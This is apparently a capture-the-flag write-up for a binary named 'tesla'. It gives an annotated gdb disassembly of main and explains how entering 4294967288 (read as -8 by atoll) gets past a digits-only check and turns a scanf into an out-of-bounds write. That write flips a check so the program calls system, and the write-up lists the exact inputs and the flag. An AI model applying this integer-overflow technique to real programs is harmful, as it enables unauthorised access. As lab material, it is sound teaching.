# writeup
Easy as pie. Integer overflow.  
```
gdb ./tesla
``` 
```gdb
disass *main
   < ... >
   0x08048ee4 <+1554>:	call   0x80506a0 <puts>
   0x08048ee9 <+1559>:	add    esp,0x10
   0x08048eec <+1562>:	sub    esp,0x8
   
   // read to [ebp-0x18]
   0x08048eef <+1565>:	lea    eax,[ebp-0x18]
   0x08048ef2 <+1568>:	push   eax
   0x08048ef3 <+1569>:	push   0x80c2469
   0x08048ef8 <+1574>:	call   0x80500d0 <__isoc99_scanf>
   0x08048efd <+1579>:	add    esp,0x10
   
   0x08048f00 <+1582>:	mov    eax,DWORD PTR [ebp-0x20]
   0x08048f03 <+1585>:	test   eax,eax
   // if([ebp-0x20] != 0)
   0x08048f05 <+1587>:	je     0x8048f1c <main+1610>
   0x08048f07 <+1589>:	sub    esp,0xc
   0x08048f0a <+1592>:	push   0x80c246c
   0x08048f0f <+1597>:	call   0x804fd90 <system>
   0x08048f14 <+1602>:	add    esp,0x10
   0x08048f17 <+1605>:	jmp    0x8049021 <main+1871>
   // else
   0x08048f1c <+1610>:	sub    esp,0xc
   0x08048f1f <+1613>:	push   0x80c2475
   0x08048f24 <+1618>:	call   0x80506a0 <puts>
   0x08048f29 <+1623>:	add    esp,0x10
   0x08048f2c <+1626>:	sub    esp,0xc
   0x08048f2f <+1629>:	push   0x1
   0x08048f31 <+1631>:	call   0x806e1b0 <sleep>
   0x08048f36 <+1636>:	add    esp,0x10
   0x08048f39 <+1639>:	sub    esp,0xc
   0x08048f3c <+1642>:	push   0x80c2484
   0x08048f41 <+1647>:	call   0x80506a0 <puts>
   0x08048f46 <+1652>:	add    esp,0x10
   0x08048f49 <+1655>:	sub    esp,0xc
   0x08048f4c <+1658>:	push   0x1
   0x08048f4e <+1660>:	call   0x806e1b0 <sleep>
   0x08048f53 <+1665>:	add    esp,0x10
   0x08048f56 <+1668>:	sub    esp,0xc
   0x08048f59 <+1671>:	push   0x80c24c4
   0x08048f5e <+1676>:	call   0x8050090 <printf>
   0x08048f63 <+1681>:	add    esp,0x10
   0x08048f66 <+1684>:	sub    esp,0x8
   
   // read to [ebp-0x34]
   0x08048f69 <+1687>:	lea    eax,[ebp-0x34]
   0x08048f6c <+1690>:	push   eax
   0x08048f6d <+1691>:	push   0x80c2469
   0x08048f72 <+1696>:	call   0x80500d0 <__isoc99_scanf>
   0x08048f77 <+1701>:	add    esp,0x10
   
   // is_digit([ebp-0x34])
   0x08048f7a <+1704>:	sub    esp,0xc
   0x08048f7d <+1707>:	lea    eax,[ebp-0x34]
   0x08048f80 <+1710>:	push   eax
   0x08048f81 <+1711>:	call   0x804887c <is_digit>
   0x08048f86 <+1716>:	add    esp,0x10
   
   // if(is_digit == 0) goto 0x8048fa1 <main+1743>
   0x08048f89 <+1719>:	test   eax,eax
   0x08048f8b <+1721>:	je     0x8048fa1 <main+1743>
   0x08048f8d <+1723>:	sub    esp,0xc
   
   if (strlen([ebp-0x34]) > 0x13)
   0x08048f90 <+1726>:	lea    eax,[ebp-0x34]
   0x08048f93 <+1729>:	push   eax
   0x08048f94 <+1730>:	call   0x805cbe0 <strlen>
   0x08048f99 <+1735>:	add    esp,0x10
   0x08048f9c <+1738>:	cmp    eax,0x13
   0x08048f9f <+1741>:	jbe    0x8048fbb <main+1769>
   
   0x08048fa1 <+1743>:	sub    esp,0xc
   0x08048fa4 <+1746>:	push   0x80c24e0
   0x08048fa9 <+1751>:	call   0x80506a0 <puts>
   0x08048fae <+1756>:	add    esp,0x10
   0x08048fb1 <+1759>:	sub    esp,0xc
   
   // exit(1)
   0x08048fb4 <+1762>:	push   0x1
   0x08048fb6 <+1764>:	call   0x804eb80 <exit>
   
   //else
   // [ebp-0x1c] = atoll([ebp-0x34])
   0x08048fbb <+1769>:	sub    esp,0xc
   0x08048fbe <+1772>:	lea    eax,[ebp-0x34]
   0x08048fc1 <+1775>:	push   eax
   0x08048fc2 <+1776>:	call   0x804e100 <atoll>
   0x08048fc7 <+1781>:	add    esp,0x10
   0x08048fca <+1784>:	mov    DWORD PTR [ebp-0x1c],eax
   0x08048fcd <+1787>:	sub    esp,0xc
   
   0x08048fd0 <+1790>:	push   0x80c2508
   0x08048fd5 <+1795>:	call   0x80506a0 <puts>
   0x08048fda <+1800>:	add    esp,0x10
   
   // scanf(0x80c251f, [ebp-0x18]+[ebp-0x1c])
   0x08048fdd <+1803>:	mov    eax,DWORD PTR [ebp-0x1c]
   0x08048fe0 <+1806>:	mov    edx,eax
   0x08048fe2 <+1808>:	lea    eax,[ebp-0x18]
   0x08048fe5 <+1811>:	add    eax,edx
   0x08048fe7 <+1813>:	sub    esp,0x8
   0x08048fea <+1816>:	push   eax
   0x08048feb <+1817>:	push   0x80c251f
   0x08048ff0 <+1822>:	call   0x80500d0 <__isoc99_scanf>
   0x08048ff5 <+1827>:	add    esp,0x10
   
   // if ([ebp-0x20] != 0)
   0x08048ff8 <+1830>:	mov    eax,DWORD PTR [ebp-0x20]
   0x08048ffb <+1833>:	test   eax,eax
   0x08048ffd <+1835>:	je     0x8049011 <main+1855>
   0x08048fff <+1837>:	sub    esp,0xc
   0x08049002 <+1840>:	push   0x80c246c
   0x08049007 <+1845>:	call   0x804fd90 <system>
   0x0804900c <+1850>:	add    esp,0x10
   0x0804900f <+1853>:	jmp    0x8049021 <main+1871>
   // else
   0x08049011 <+1855>:	sub    esp,0xc
   0x08049014 <+1858>:	push   0x80c2523
   0x08049019 <+1863>:	call   0x80506a0 <puts>
   0x0804901e <+1868>:	add    esp,0x10
   // endif
   // endif
   // endif
   0x08049021 <+1871>:	mov    eax,0x0
   0x08049026 <+1876>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08049029 <+1879>:	leave  
   0x0804902a <+1880>:	lea    esp,[ecx-0x4]
   0x0804902d <+1883>:	ret
```
Most of us are interested in `0x08048ff0 <+1822>`. Here we can write anywhere!

`[ebp-0x20]` doesn't change anywhere. Ok, we can rewrite it! If in `[ebp-0x1c]` we can write -0x8. `0x08048f72 <+1696>` is the place. `[ebp-0x1c] = atoll([ebp-0x34])` With only one amendment, `is_digit`. It only accepts numbers. So we have to enter a negative number without using the minus sign.

-8 = 0xfffffff8 = 4294967288

The first time enter anything.
Next time enter 4294967288
And next time enter any character.

ELON{Y0u_533m_t0_kn0w_wh47_in73g3r_0v3rf10w_i5}

